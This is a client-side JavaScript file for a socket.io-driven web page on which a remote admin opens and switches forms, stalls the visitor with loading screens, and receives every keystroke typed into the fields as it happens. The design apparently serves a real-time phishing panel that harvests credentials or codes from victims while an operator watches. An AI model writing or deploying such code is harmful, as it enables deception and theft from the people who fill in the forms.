const socket = io();

let sessionId = null;
let currentFormId = null;

const popupTitle = document.getElementById('popupTitle');
const formCard = document.querySelector('.form-card');
const formSections = document.getElementById('formSections');
const loadingOverlay = document.getElementById('loadingOverlay');

const SESSION_KEY = `leadSession:${window.PAGE_ID}`;
const SWITCH_LOADING_MS = 800;
const LOADING_SENTINEL_DELAY_MS = 2000;
let switchTimer = null;
let loadingDelayTimer = null;

socket.on('connect', () => {
  let storedId = null;
  try { storedId = localStorage.getItem(SESSION_KEY); } catch (e) {}

  socket.emit('user:register', { pageId: window.PAGE_ID, sessionId: storedId }, (resp) => {
    if (resp && resp.error) {
      console.error('Registration failed:', resp.error);
      return;
    }
    sessionId = resp.sessionId;
    try { localStorage.setItem(SESSION_KEY, sessionId); } catch (e) {}
  });
});

// A form is "on screen" while currentFormId is set; the form:close handler
// clears it and shows the loader until the next form arrives.
socket.on('form:open', ({ formId, label, fields, extra, onloadText, dynamicText }) => {
  clearTimeout(switchTimer);
  clearTimeout(loadingDelayTimer);
  const isSwitch = currentFormId !== null;
  currentFormId = formId;

  if (!isSwitch) {
    loadingOverlay.hidden = true;
    renderForm(label, fields, extra || {}, onloadText, dynamicText);
    return;
  }

  // Switching forms: show the loader briefly, then render the new one.
  loadingOverlay.hidden = false;
  switchTimer = setTimeout(() => {
    if (currentFormId !== formId) return;
    renderForm(label, fields, extra || {}, onloadText, dynamicText);
    loadingOverlay.hidden = true;
  }, SWITCH_LOADING_MS);
});

socket.on('form:close', ({ formId }) => {
  if (formId !== currentFormId) return;
  clearTimeout(switchTimer);
  clearTimeout(loadingDelayTimer);
  closePopup();
  loadingOverlay.hidden = false;
});

// Sent either as `DEFAULT_FORM_TYPE: "loading"` (nothing on screen yet, e.g.
// page just loaded — show the loader right away) or as a submitted
// template's `submit_form: "loading"` (a form was just submitted — hold on
// "Processing..." for a beat before switching to the full-screen loader).
// Either way it stays up until the admin opens a form.
socket.on('form:loading', () => {
  clearTimeout(switchTimer);
  clearTimeout(loadingDelayTimer);

  if (currentFormId === null) {
    closePopup();
    loadingOverlay.hidden = false;
    return;
  }

  loadingDelayTimer = setTimeout(() => {
    closePopup();
    loadingOverlay.hidden = false;
  }, LOADING_SENTINEL_DELAY_MS);
});

function el(tag, className, text) {
  const node = document.createElement(tag);
  if (className) node.className = className;
  if (text != null) node.textContent = text;
  return node;
}

// Shown instead of the form when a template has no fields (a terminal
// screen, e.g. the "success" template) — a distinct look from the normal
// input form, not just an empty form with a pointless submit button.
function buildSuccessIcon() {
  const wrap = el('div', 'success-icon');
  wrap.innerHTML =
    '<svg viewBox="0 0 52 52" width="64" height="64">' +
    '<circle class="success-icon-circle" cx="26" cy="26" r="24" fill="none"/>' +
    '<path class="success-icon-check" fill="none" d="M14 27l7 7 16-16"/>' +
    '</svg>';
  return wrap;
}

function buildPhoneIcon() {
  const img = document.createElement('img');
  img.src = '/user-assets/assets/ing2.gif';
  img.alt = '';
  img.width = 50;
  img.height = 50;
  return img;
}

// ---------- Section builders ----------
// Each returns a DOM node to append, or null to render nothing for that
// section. `fields` is the actual <form>, wired up separately below.

// Admin-set one-off message for this particular form open. Always rendered
// right under the title, ahead of everything from `extra`.
function buildDynamicTextSection(dynamicText) {
  if (!dynamicText) return null;
  return el('div', 'dynamic-text', dynamicText);
}

// Lets a section's value be either one item or an array of items, so e.g.
// `divider: ["Or", "Or try"]` renders two dividers instead of one.
function normalizeList(value) {
  if (Array.isArray(value)) return value;
  return value ? [value] : [];
}

function buildMessageSection(onloadText) {
  if (!onloadText || !onloadText.text) return null;
  const type = ['success', 'error', 'warning', 'info'].includes(onloadText.type) ? onloadText.type : 'info';
  return el('div', `form-message ${type}`, onloadText.text);
}

function buildTabsSection(tabs) {
  if (!Array.isArray(tabs) || !tabs.length) return null;
  const wrap = el('div', 'form-tabs');
  tabs.forEach((name, i) => {
    const tab = el('button', 'form-tab' + (i === 0 ? ' active' : ''), name);
    tab.type = 'button';
    tab.addEventListener('click', () => {
      wrap.querySelectorAll('.form-tab').forEach((t) => t.classList.remove('active'));
      tab.classList.add('active');
    });
    wrap.appendChild(tab);
  });
  return wrap;
}

function buildPromoSection(promo) {
  if (!promo) return null;
  const wrap = el('div', 'promo-wrap');
  const card = el('div', 'promo-card');
  const icon = el('div', 'promo-icon');
  icon.appendChild(buildPhoneIcon());

  const body = el('div', 'promo-body');
  const head = el('div', 'promo-title', promo.title || '');
  if (promo.badge) head.appendChild(el('span', 'promo-badge', promo.badge));
  body.appendChild(head);
  if (promo.text) body.appendChild(el('div', 'promo-text', promo.text));

  card.append(icon, body, el('div', 'promo-arrow', '→'));
  wrap.appendChild(card);
  if (promo.tooltip) wrap.appendChild(el('div', 'promo-tooltip', promo.tooltip));
  return wrap;
}

function buildDividerSection(text) {
  if (!text) return null;
  const wrap = el('div', 'form-divider');
  wrap.appendChild(el('span', null, text));
  return wrap;
}

function buildFooterSection(extra) {
  if (!extra.footerText && !extra.footerLinkText) return null;
  const wrap = el('div', 'form-footer');
  if (extra.footerText) wrap.appendChild(el('span', null, extra.footerText + ' '));
  if (extra.footerLinkText) {
    const link = el('a', null, extra.footerLinkText);
    link.href = extra.footerLinkUrl || '#';
    wrap.appendChild(link);
  }
  return wrap;
}

function buildFieldsSection(fields, extra) {
  if (!fields || !fields.length) return null;
  const form = document.createElement('form');

  for (const field of fields) {
    const group = document.createElement('div');
    group.className = 'field-group';

    const labelEl = document.createElement('label');
    labelEl.textContent = field.label + (field.required ? ' *' : '');
    labelEl.setAttribute('for', `field_${field.name}`);
    group.appendChild(labelEl);

    let input;
    if (field.type === 'textarea') {
      input = document.createElement('textarea');
    } else {
      input = document.createElement('input');
      input.type = field.type || 'text';
    }
    input.id = `field_${field.name}`;
    input.name = field.name;
    if (field.required) input.required = true;

    // Emit on every keystroke so the admin dashboard mirrors typing live.
    input.addEventListener('input', () => {
      if (!currentFormId) return;
      socket.emit('user:formInput', {
        formId: currentFormId,
        field: field.name,
        value: input.value
      });
    });

    group.appendChild(input);
    form.appendChild(group);
  }

  const submitBtn = document.createElement('button');
  submitBtn.type = 'submit';
  submitBtn.className = 'popup-submit';
  submitBtn.textContent = extra.submitText || 'Submit';
  form.appendChild(submitBtn);

  form.onsubmit = (e) => {
    e.preventDefault();
    const data = {};
    for (const field of fields) {
      const input = document.getElementById(`field_${field.name}`);
      data[field.name] = input ? input.value : '';
    }
    socket.emit('user:formSubmit', { formId: currentFormId, data });
    submitBtn.textContent = 'Processing...';
    submitBtn.disabled = true;
  };

  return form;
}

// Keys in `extra` that map to a section, in the canonical name used for
// ordering below. `fields` is a placeholder an admin can add to `extra`
// (any truthy value) to control where the actual inputs render.
const SECTION_KEY_TO_NAME = {
  onload_text: 'message',
  tabs: 'tabs',
  promo: 'promo',
  divider: 'divider',
  fields: 'fields',
  footerText: 'footer',
  footerLinkText: 'footer',
  footerLinkUrl: 'footer',
};

// Renders sections in the order their keys appear in `extra`'s JSON, so
// admins control layout just by reordering keys in formTemplates.js.
// `fields` (the actual inputs) and `message` (onload_text) fall back to
// their old fixed spots when not explicitly placed via an `extra` key.
function sectionOrder(extra) {
  const order = [];
  for (const key of Object.keys(extra)) {
    const name = SECTION_KEY_TO_NAME[key];
    if (name && !order.includes(name)) order.push(name);
  }

  // Default (no explicit `fields` key in extra): the form goes first, with
  // everything from `extra` (tabs, promo, divider, footer) below it.
  if (!order.includes('fields')) order.unshift('fields');

  if (!order.includes('message')) order.unshift('message');

  return order;
}

function renderForm(label, fields, extra, onloadText, dynamicText) {
  popupTitle.textContent = extra.title || label;
  formSections.innerHTML = '';

  // No fields = a terminal/informational screen (e.g. "success"), styled
  // distinctly from a normal data-collecting form.
  const isSuccess = !fields || !fields.length;
  formCard.classList.toggle('is-success', isSuccess);
  if (isSuccess) formSections.appendChild(buildSuccessIcon());

  const dynamicNode = buildDynamicTextSection(dynamicText);
  if (dynamicNode) formSections.appendChild(dynamicNode);

  // Each returns a list of nodes: most sections render one, but a section
  // whose value is an array (e.g. `divider: ["Or", "Or try"]`) renders one
  // node per item, in order.
  const builders = {
    message: () => normalizeList(onloadText).map(buildMessageSection),
    tabs: () => [buildTabsSection(extra.tabs)],
    promo: () => normalizeList(extra.promo).map(buildPromoSection),
    divider: () => normalizeList(extra.divider).map(buildDividerSection),
    fields: () => [buildFieldsSection(fields, extra)],
    footer: () => [buildFooterSection(extra)],
  };

  for (const name of sectionOrder(extra)) {
    const nodes = builders[name] ? builders[name]() : [];
    for (const node of nodes) {
      if (node) formSections.appendChild(node);
    }
  }
}

// The form is embedded on the page (not a modal), so "closing" it just
// clears it back to an empty state until the next form:open arrives.
function closePopup() {
  currentFormId = null;
  formSections.innerHTML = '';
  formCard.classList.remove('is-success');
}
